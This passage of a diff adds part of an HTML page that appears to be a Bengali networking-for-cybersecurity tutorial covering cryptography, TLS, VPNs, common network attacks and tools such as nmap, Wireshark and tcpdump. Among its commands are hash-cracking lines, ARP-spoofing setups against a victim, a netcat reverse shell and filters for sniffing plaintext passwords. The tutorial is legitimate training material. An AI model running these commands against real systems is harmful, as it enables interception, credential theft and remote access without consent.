+  | Receiver-এর Public Key দিয়ে      | নিজের Private Key দিয়ে
+  | Encrypt → "X7$mK9#"  ──────────→ | Decrypt → "Hello"
+  |                                    |
+  
+Digital Signature (বিপরীত):
+Sender নিজের Private Key দিয়ে Sign করে
+Receiver Sender-এর Public Key দিয়ে Verify করে
+</pre>
+    </div>
+
+    <table>
+      <thead><tr><th>অ্যালগরিদম</th><th>Key Size</th><th>স্ট্যাটাস</th><th>ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td>RSA-2048</td><td>2048-bit</td><td>✅ ঠিক আছে</td><td>SSL/TLS, SSH, Email</td></tr>
+        <tr><td>RSA-4096</td><td>4096-bit</td><td>✅ ভালো</td><td>High security</td></tr>
+        <tr><td>ECC (P-256)</td><td>256-bit</td><td>✅ সর্বোচ্চ ভালো</td><td>TLS 1.3, মোবাইল</td></tr>
+        <tr><td>Ed25519</td><td>256-bit</td><td>✅ সর্বোচ্চ</td><td>SSH Key, Modern TLS</td></tr>
+        <tr><td>DSA</td><td>1024-bit</td><td>⚠️ দুর্বল</td><td>Legacy</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">Hashing — একমুখী ফাংশন</h2>
+    <p>Hash এমন একটি ফাংশন যা যেকোনো ডেটা থেকে নির্দিষ্ট দৈর্ঘ্যের একটি মান তৈরি করে। Hash থেকে মূল ডেটা বের করা অসম্ভব।</p>
+
+    <div class="code-block">
+echo -n "Hello" | md5sum      <span class="comment"># 8b1a9953c4611296a827abf8c47804d7</span>
+echo -n "Hello" | sha256sum   <span class="comment"># 185f8db32921...  (256-bit)</span>
+echo -n "Hello" | sha512sum   <span class="comment"># 3615f80c9d29...  (512-bit)</span>
+
+<span class="comment"># Hash Cracking</span>
+hashcat -m 0 hash.txt rockyou.txt    <span class="comment"># MD5 crack</span>
+hashcat -m 1000 hash.txt wordlist.txt <span class="comment"># NTLM crack (Windows)</span>
+john --wordlist=rockyou.txt hash.txt  <span class="comment"># John the Ripper</span>
+    </div>
+
+    <table>
+      <thead><tr><th>অ্যালগরিদম</th><th>Output</th><th>স্ট্যাটাস</th><th>ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td>MD5</td><td>128-bit</td><td>❌ ভাঙা! Collision সম্ভব</td><td>পুরনো, ব্যবহার করবেন না</td></tr>
+        <tr><td>SHA-1</td><td>160-bit</td><td>❌ ভাঙা</td><td>পুরনো SSL-এ ছিল</td></tr>
+        <tr><td>SHA-256</td><td>256-bit</td><td>✅ নিরাপদ</td><td>Bitcoin, TLS, Password</td></tr>
+        <tr><td>SHA-512</td><td>512-bit</td><td>✅ ভালো</td><td>High security</td></tr>
+        <tr><td>bcrypt</td><td>Variable</td><td>✅ পাসওয়ার্ডের জন্য সেরা</td><td>Password hashing</td></tr>
+        <tr><td>Argon2</td><td>Variable</td><td>✅ সর্বোচ্চ সেরা</td><td>Modern password hashing</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">TLS/SSL — HTTPS-এর ভিত্তি</h2>
+
+    <div class="diagram">
+<pre>
+TLS Handshake (সরলীকৃত):
+Client                          Server
+  |                                |
+  |── ClientHello (TLS version, ──→|
+  |   supported ciphers)           |
+  |                                |
+  |←── ServerHello + Certificate ──|
+  |    (Server-এর Public Key সহ)  |
+  |                                |
+  |── Pre-Master Secret ──────────→| (Server-এর Public Key দিয়ে encrypt)
+  |   (র‍্যান্ডম নম্বর)            |
+  |                                |
+  |   উভয়পক্ষ Session Key তৈরি করে|
+  |                                |
+  |══════ Encrypted Data ══════════| (Symmetric AES দিয়ে)
+</pre>
+    </div>
+
+    <table>
+      <thead><tr><th>ভার্সন</th><th>স্ট্যাটাস</th><th>সমস্যা</th></tr></thead>
+      <tbody>
+        <tr><td>SSL 2.0</td><td>❌ বন্ধ করুন</td><td>অনেক দুর্বলতা</td></tr>
+        <tr><td>SSL 3.0</td><td>❌ বন্ধ করুন</td><td>POODLE Attack</td></tr>
+        <tr><td>TLS 1.0</td><td>❌ বন্ধ করুন</td><td>BEAST, POODLE</td></tr>
+        <tr><td>TLS 1.1</td><td>⚠️ দুর্বল</td><td>RC4 সমস্যা</td></tr>
+        <tr><td>TLS 1.2</td><td>✅ ঠিক আছে</td><td>সঠিক cipher suite দরকার</td></tr>
+        <tr><td>TLS 1.3</td><td>✅ সর্বোচ্চ</td><td>দ্রুত ও সবচেয়ে নিরাপদ</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">PKI ও SSL Certificate</h2>
+    <p>PKI (Public Key Infrastructure) হলো Certificate ব্যবস্থাপনার একটি সিস্টেম।</p>
+    <ul>
+      <li><strong>Certificate Authority (CA):</strong> DigiCert, Let's Encrypt — Certificate ইস্যু করে</li>
+      <li><strong>DV Certificate:</strong> শুধু Domain verify করে (সবচেয়ে সহজ)</li>
+      <li><strong>OV Certificate:</strong> Organization verify করে</li>
+      <li><strong>EV Certificate:</strong> সম্পূর্ণ যাচাই, ব্রাউজারে সবুজ রঙে company নাম দেখায়</li>
+      <li><strong>Wildcard Certificate:</strong> *.example.com — সব subdomain কভার করে</li>
+    </ul>
+
+    <div class="code-block">
+<span class="comment"># SSL Certificate চেক করা</span>
+openssl s_client -connect google.com:443
+sslyze --regular target.com     <span class="comment"># SSL দুর্বলতা স্ক্যান</span>
+testssl.sh target.com           <span class="comment"># বিস্তারিত SSL অ্যানালাইসিস</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- CHAPTER 9 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 09</div>
+    <div class="chapter-title">🛡️ নেটওয়ার্ক সিকিউরিটি কনসেপ্ট</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">VPN (Virtual Private Network)</h2>
+    <p>VPN এনক্রিপ্টেড টানেল তৈরি করে Public Internet-এর মধ্য দিয়ে নিরাপদে ডেটা পাঠায়।</p>
+
+    <div class="diagram">
+<pre>
+তোমার PC ──→ [Encrypted Tunnel] ──→ VPN Server ──→ Internet
+              (ISP দেখতে পায় না)
+
+Site-to-Site VPN:
+Office A ──→ [VPN Tunnel] ──→ Office B
+(দুটো অফিস একটি নেটওয়ার্কের মতো কাজ করে)
+</pre>
+    </div>
+
+    <table>
+      <thead><tr><th>VPN Protocol</th><th>পোর্ট</th><th>গতি</th><th>নিরাপত্তা</th><th>ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td>OpenVPN</td><td>1194/UDP</td><td>ভালো</td><td>✅ উচ্চ</td><td>সবচেয়ে জনপ্রিয় Open Source</td></tr>
+        <tr><td>WireGuard</td><td>51820/UDP</td><td>সর্বোচ্চ</td><td>✅ উচ্চ</td><td>আধুনিক, দ্রুততম</td></tr>
+        <tr><td>IPsec/IKEv2</td><td>500/UDP</td><td>ভালো</td><td>✅ উচ্চ</td><td>Mobile VPN</td></tr>
+        <tr><td>L2TP/IPsec</td><td>1701/UDP</td><td>মাঝারি</td><td>✅ ঠিক আছে</td><td>Enterprise</td></tr>
+        <tr><td>PPTP</td><td>1723/TCP</td><td>দ্রুত</td><td>❌ দুর্বল</td><td>ব্যবহার করবেন না!</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">Zero Trust সিকিউরিটি মডেল</h2>
+    <p><strong>"Never Trust, Always Verify"</strong> — এই নীতিতে কেউই স্বয়ংক্রিয়ভাবে বিশ্বাসযোগ্য নয়, ভেতরে থাকলেও।</p>
+
+    <div class="grid-2">
+      <div class="grid-card">
+        <h4>পুরনো মডেল (Perimeter Security)</h4>
+        <ul>
+          <li>Firewall-এর ভেতরে থাকলে বিশ্বাস করো</li>
+          <li>বাইরেরটা block করো</li>
+          <li>ভেতরে ঢুকলেই সব অ্যাক্সেস</li>
+        </ul>
+        <p>❌ সমস্যা: একজন insider বা হ্যাকড অ্যাকাউন্ট সব কিছু নষ্ট করতে পারে</p>
+      </div>
+      <div class="grid-card">
+        <h4>Zero Trust মডেল</h4>
+        <ul>
+          <li>প্রতিটি request verify করো</li>
+          <li>Least privilege দাও</li>
+          <li>সব কিছু log করো</li>
+          <li>Microsegmentation ব্যবহার করো</li>
+        </ul>
+        <p>✅ সুবিধা: ভেতরে ঢুকলেও সীমিত ক্ষতি করতে পারে</p>
+      </div>
+    </div>
+
+    <h2 class="section-title">সাধারণ নেটওয়ার্ক অ্যাটাক</h2>
+
+    <h3 class="sub-title">১. Man-in-the-Middle (MITM) Attack</h3>
+    <div class="diagram">
+<pre>
+স্বাভাবিক:  Client ────────────────── Server
+MITM:        Client ── Hacker ──────── Server
+             (Hacker মাঝখানে ট্র্যাফিক দেখে ও পরিবর্তন করে)
+
+পদ্ধতি:
+- ARP Spoofing → LAN-এ MITM
+- Evil Twin → WiFi-এ MITM
+- SSL Stripping → HTTPS কে HTTP-তে নামায়
+- DNS Spoofing → ভুল সার্ভারে নিয়ে যায়
+</pre>
+    </div>
+
+    <h3 class="sub-title">২. DDoS (Distributed Denial of Service)</h3>
+    <table>
+      <thead><tr><th>ধরন</th><th>পদ্ধতি</th><th>উদাহরণ</th></tr></thead>
+      <tbody>
+        <tr><td>Volumetric</td><td>ব্যান্ডউইথ ভরিয়ে দেওয়া</td><td>UDP Flood, ICMP Flood</td></tr>
+        <tr><td>Protocol</td><td>সার্ভার রিসোর্স শেষ করা</td><td>SYN Flood, Ping of Death</td></tr>
+        <tr><td>Application</td><td>Layer 7-এ অ্যাটাক</td><td>HTTP Flood, Slowloris</td></tr>
+        <tr><td>Amplification</td><td>ছোট request → বড় response</td><td>DNS Amplification, NTP Amplification</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub-title">৩. Port Scanning</h3>
+    <div class="code-block">
+<span class="comment"># Nmap - সবচেয়ে জনপ্রিয় পোর্ট স্ক্যানার</span>
+nmap -sV 192.168.1.1           <span class="comment"># Service version detect</span>
+nmap -sS target.com             <span class="comment"># SYN Stealth Scan</span>
+nmap -p- target.com             <span class="comment"># সব পোর্ট স্ক্যান</span>
+nmap -A -T4 target.com          <span class="comment"># Aggressive Scan</span>
+nmap -sU target.com             <span class="comment"># UDP Scan</span>
+nmap --script vuln target.com   <span class="comment"># Vulnerability Scan</span>
+    </div>
+
+    <h3 class="sub-title">৪. ARP Spoofing — MITM-এর ভিত্তি</h3>
+    <div class="code-block">
+<span class="comment"># Kali Linux-এ ARP Spoofing</span>
+arpspoof -i eth0 -t [victim_ip] [gateway_ip]
+arpspoof -i eth0 -t [gateway_ip] [victim_ip]
+
+<span class="comment"># IP Forwarding চালু করো</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+<span class="comment"># অথবা ettercap দিয়ে</span>
+ettercap -T -q -i eth0 -M arp:remote /[victim]// /[gateway]//
+    </div>
+
+    <h2 class="section-title">Firewall Rule বোঝা</h2>
+    <div class="code-block">
+<span class="comment"># iptables (Linux Firewall)</span>
+iptables -L -n -v                          <span class="comment"># Current rules দেখা</span>
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT   <span class="comment"># SSH allow</span>
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT   <span class="comment"># HTTP allow</span>
+iptables -A INPUT -j DROP                   <span class="comment"># বাকি সব block</span>
+
+<span class="comment"># UFW (Ubuntu)</span>
+ufw enable
+ufw allow ssh
+ufw allow 80/tcp
+ufw deny from 192.168.1.100    <span class="comment"># নির্দিষ্ট IP block</span>
+    </div>
+
+    <h2 class="section-title">নেটওয়ার্ক সিকিউরিটি Architecture</h2>
+    <div class="diagram">
+<pre>
+Internet
+    |
+[Firewall - Edge]
+    |
+[DMZ Zone]
+├── Web Server
+├── Mail Server
+└── DNS Server
+    |
+[Internal Firewall]
+    |
+[Internal Network]
+├── [HR Subnet - 10.10.1.0/24]
+├── [Finance Subnet - 10.10.2.0/24]
+├── [IT Subnet - 10.10.3.0/24]
+└── [Database Subnet - 10.10.4.0/24]
+
+DMZ = DeMilitarized Zone
+(Internet থেকে access পায় কিন্তু
+Internal Network থেকে আলাদা)
+</pre>
+    </div>
+
+  </div>
+</div>
+
+<!-- CHAPTER 10 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 10</div>
+    <div class="chapter-title">🔬 নেটওয়ার্ক অ্যানালাইসিস টুল</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">Wireshark — প্যাকেট অ্যানালাইজার</h2>
+    <p>Wireshark হলো সবচেয়ে জনপ্রিয় নেটওয়ার্ক প্রোটোকল অ্যানালাইজার। নেটওয়ার্ক ট্র্যাফিক ক্যাপচার করে বিশ্লেষণ করা যায়।</p>
+
+    <h3 class="sub-title">গুরুত্বপূর্ণ Wireshark Filter</h3>
+    <div class="code-block">
+<span class="comment"># Wireshark Display Filter</span>
+ip.addr == 192.168.1.1          <span class="comment"># নির্দিষ্ট IP-এর সব ট্র্যাফিক</span>
+tcp.port == 80                   <span class="comment"># HTTP ট্র্যাফিক</span>
+http.request                     <span class="comment"># শুধু HTTP Request</span>
+http.response.code == 200        <span class="comment"># সফল HTTP Response</span>
+dns                              <span class="comment"># সব DNS ট্র্যাফিক</span>
+tcp.flags.syn == 1               <span class="comment"># SYN Packet (Port scan দেখা)</span>
+ftp                              <span class="comment"># FTP ট্র্যাফিক (পাসওয়ার্ড দেখা যাবে!)</span>
+http contains "password"         <span class="comment"># HTTP-তে পাসওয়ার্ড খোঁজা</span>
+!(arp or dns or icmp)            <span class="comment"># নয়েজ ফিল্টার করা</span>
+    </div>
+
+    <h3 class="sub-title">tcpdump — Command Line প্যাকেট ক্যাপচার</h3>
+    <div class="code-block">
+tcpdump -i eth0                           <span class="comment"># eth0-এ ট্র্যাফিক ক্যাপচার</span>
+tcpdump -i eth0 -w capture.pcap          <span class="comment"># ফাইলে সেভ</span>
+tcpdump -r capture.pcap                  <span class="comment"># ফাইল পড়া</span>
+tcpdump host 192.168.1.100               <span class="comment"># নির্দিষ্ট Host</span>
+tcpdump port 80                          <span class="comment"># HTTP ট্র্যাফিক</span>
+tcpdump -i eth0 'tcp[13] == 2'          <span class="comment"># SYN Packet</span>
+tcpdump -A -i eth0 port 21              <span class="comment"># FTP পাসওয়ার্ড দেখা (Plaintext)</span>
+    </div>
+
+    <h2 class="section-title">Nmap — নেটওয়ার্ক ম্যাপার</h2>
+    <div class="code-block">
+<span class="comment"># বেসিক স্ক্যান</span>
+nmap 192.168.1.1                   <span class="comment"># একটি Host স্ক্যান</span>
+nmap 192.168.1.0/24                <span class="comment"># পুরো সাবনেট স্ক্যান</span>
+nmap -p 22,80,443 target.com       <span class="comment"># নির্দিষ্ট পোর্ট</span>
+nmap -p- target.com                <span class="comment"># সব ৬৫৫৩৫ পোর্ট</span>
+
+<span class="comment"># উন্নত স্ক্যান</span>
+nmap -sV target.com                <span class="comment"># Service Version</span>
+nmap -O target.com                 <span class="comment"># OS Detection</span>
+nmap -A target.com                 <span class="comment"># সব একসাথে</span>
+nmap -sS target.com                <span class="comment"># Stealth SYN Scan</span>
+nmap -sU target.com                <span class="comment"># UDP Scan</span>
+nmap -sn 192.168.1.0/24           <span class="comment"># Host Discovery (Ping Sweep)</span>
+
+<span class="comment"># NSE Script</span>
+nmap --script=http-title target.com
+nmap --script=smb-vuln-ms17-010 target.com   <span class="comment"># EternalBlue চেক</span>
+nmap --script=vuln target.com      <span class="comment"># সাধারণ Vulnerability</span>
+nmap --script=default target.com
+    </div>
+
+    <h2 class="section-title">Netcat — সুইস আর্মি নাইফ</h2>
+    <div class="code-block">
+<span class="comment"># Port Listener</span>
+nc -lvp 4444                       <span class="comment"># পোর্ট 4444-এ listen</span>
+
+<span class="comment"># Connect</span>
+nc 192.168.1.1 80                  <span class="comment"># পোর্ট 80-এ connect</span>
+
+<span class="comment"># Reverse Shell</span>
+nc -e /bin/bash 192.168.1.10 4444  <span class="comment"># Victim-এ চালাও</span>
+
+<span class="comment"># Port Scanning</span>
+nc -zv target.com 1-1000           <span class="comment"># পোর্ট স্ক্যান</span>
+
+<span class="comment"># File Transfer</span>
+nc -lvp 4444 > received_file       <span class="comment"># Receiver</span>
+nc 192.168.1.1 4444 < file.txt     <span class="comment"># Sender</span>
+    </div>
+
+    <h2 class="section-title">অন্যান্য গুরুত্বপূর্ণ টুল</h2>
+    <table>
+      <thead><tr><th>টুল</th><th>কাজ</th><th>কমান্ড উদাহরণ</th></tr></thead>
+      <tbody>
+        <tr><td><strong>ping</strong></td><td>Host জীবিত আছে কিনা</td><td>ping google.com</td></tr>
+        <tr><td><strong>traceroute</strong></td><td>প্যাকেটের পথ দেখা</td><td>traceroute google.com</td></tr>
+        <tr><td><strong>netstat</strong></td><td>সক্রিয় সংযোগ দেখা</td><td>netstat -tulnp</td></tr>
+        <tr><td><strong>ss</strong></td><td>Socket Statistics</td><td>ss -tulnp</td></tr>
+        <tr><td><strong>arp</strong></td><td>ARP Table দেখা</td><td>arp -a</td></tr>
+        <tr><td><strong>route</strong></td><td>Routing Table দেখা</td><td>route -n</td></tr>
+        <tr><td><strong>ifconfig/ip</strong></td><td>নেটওয়ার্ক Interface</td><td>ip addr show</td></tr>
+        <tr><td><strong>whois</strong></td><td>Domain তথ্য</td><td>whois google.com</td></tr>
+        <tr><td><strong>curl</strong></td><td>HTTP Request করা</td><td>curl -I https://target.com</td></tr>
+        <tr><td><strong>masscan</strong></td><td>দ্রুত পোর্ট স্ক্যান</td><td>masscan -p1-65535 target</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">প্যাকেট অ্যানালাইসিস — হ্যান্ডস-অন</h2>
+
+    <h3 class="sub-title">HTTP Login ক্যাপচার করা (শিক্ষামূলক)</h3>
+    <div class="code-block">
+<span class="comment"># HTTP (Plaintext) Login ক্যাপচার</span>
+tcpdump -i eth0 -A port 80 | grep -i "password\|user\|login"
+
+<span class="comment"># Wireshark Filter:</span>
+http.request.method == "POST"
+<span class="comment"># তারপর Follow TCP Stream করলে Form Data দেখা যাবে</span>
+<span class="comment"># এই কারণেই HTTPS বাধ্যতামূলক!</span>
+    </div>
+
+    <h3 class="sub-title">SYN Scan কীভাবে Wireshark-এ দেখায়</h3>
+    <div class="diagram">
+<pre>
+Port Open:    SYN → SYN-ACK → RST   (পোর্ট খোলা)
+Port Closed:  SYN → RST             (পোর্ট বন্ধ)
+Filtered:     SYN → (কোনো response নেই)  (Firewall আছে)
+</pre>
+    </div>
+
+    <div class="summary">
+      <h3>📋 সারসংক্ষেপ — সাইবার সিকিউরিটির জন্য নেটওয়ার্কিং চেকলিস্ট</h3>
+      <ul>
+        <li>✅ OSI ও TCP/IP মডেলের প্রতিটি লেয়ার এবং সেখানে হওয়া অ্যাটাক বোঝো</li>
+        <li>✅ IP Addressing, Subnetting ও CIDR notation আয়ত্ত করো</li>
+        <li>✅ TCP Three-Way Handshake ও UDP পার্থক্য ভালোভাবে বোঝো</li>
+        <li>✅ গুরুত্বপূর্ণ পোর্ট নম্বর মুখস্থ করো (22, 80, 443, 445, 3389...)</li>
+        <li>✅ DNS কীভাবে কাজ করে ও DNS অ্যাটাক বোঝো</li>
+        <li>✅ ক্রিপ্টোগ্রাফি — Symmetric, Asymmetric, Hashing, TLS জানো</li>
+        <li>✅ Wireshark দিয়ে প্যাকেট পড়তে পারো</li>
+        <li>✅ Nmap দিয়ে নেটওয়ার্ক স্ক্যান করতে পারো</li>
+        <li>✅ ওয়্যারলেস সিকিউরিটি ও WPA2 crack বুঝতে পারো</li>
+        <li>✅ Firewall Rules বুঝতে ও লিখতে পারো</li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- FINAL PAGE -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">NEXT STEPS</div>
+    <div class="chapter-title">🚀 পরবর্তী পদক্ষেপ</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">প্র্যাকটিস করার জায়গা</h2>
+    <table>
+      <thead><tr><th>প্ল্যাটফর্ম</th><th>কী শিখবে</th><th>খরচ</th></tr></thead>
+      <tbody>
+        <tr><td><strong>TryHackMe</strong></td><td>Networking, Linux, Web Hacking</td><td>আংশিক ফ্রি</td></tr>
+        <tr><td><strong>HackTheBox</strong></td><td>Real-world machine hacking</td><td>আংশিক ফ্রি</td></tr>
+        <tr><td><strong>PortSwigger Web Academy</strong></td><td>Web application security</td><td>সম্পূর্ণ ফ্রি</td></tr>
+        <tr><td><strong>Cisco Packet Tracer</strong></td><td>নেটওয়ার্ক সিমুলেশন</td><td>ফ্রি</td></tr>
+        <tr><td><strong>GNS3</strong></td><td>উন্নত নেটওয়ার্ক সিমুলেশন</td><td>ফ্রি</td></tr>
+        <tr><td><strong>VulnHub</strong></td><td>VM-based CTF</td><td>সম্পূর্ণ ফ্রি</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">সার্টিফিকেশন রোডম্যাপ</h2>
+    <div class="diagram">
+<pre>
+Beginner:
+CompTIA Network+ → CompTIA Security+
+        ↓
+Intermediate:
+CEH (Certified Ethical Hacker)
+eJPT (eLearnSecurity Junior Penetration Tester)
+        ↓
+Advanced:
+OSCP (Offensive Security Certified Professional) — সেরা!
+PNPT (Practical Network Penetration Tester)
+        ↓
+Expert:
+OSCE3, CRTE, CRTO (Red Team Operations)
+</pre>
+    </div>
+
+    <div class="box box-info">
+      <div class="box-title">💡 শেষ কথা</div>
+      নেটওয়ার্কিং শেখা একদিনে হয় না। Kali Linux-এ বিভিন্ন টুল নিয়ে নিজে পরীক্ষা করো, TryHackMe-তে Lab করো, এবং সবচেয়ে গুরুত্বপূর্ণ — সব সময় ethical উপায়ে শেখো। তোমার কাছে ইতোমধ্যে VirtualBox ও Kali Linux আছে — এটাই যথেষ্ট শুরু করার জন্য!
+    </div>
+
+    <div style="text-align:center; margin-top:50px; color:#999; font-size:13px;">
+      <p>এই ডকুমেন্টটি সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে তৈরি।</p>
+      <p>Ethical Hacking শুধুমাত্র অনুমতিপ্রাপ্ত পরিবেশে প্র্যাকটিস করুন।</p>
+      <p style="margin-top:10px;">🛡️ Stay Ethical. Stay Legal. Stay Curious.</p>
+    </div>
+
+  </div>
+</div>
+
+</body>
+</html>
